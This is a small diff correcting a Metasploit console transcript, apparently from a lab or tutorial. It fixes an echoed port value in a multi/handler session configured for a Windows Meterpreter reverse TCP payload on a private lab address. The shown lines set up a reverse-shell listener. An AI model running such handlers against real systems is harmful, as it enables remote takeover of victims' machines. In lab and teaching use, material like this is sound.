@@ -16,7 +16,7 @@ msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 msf exploit(multi/handler) > set lhost 10.0.2.6
 lhost => 10.0.2.6
 msf exploit(multi/handler) > set lport 4444
-lport => 443
+lport => 4444
 msf exploit(multi/handler) > exploit -j
 [*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
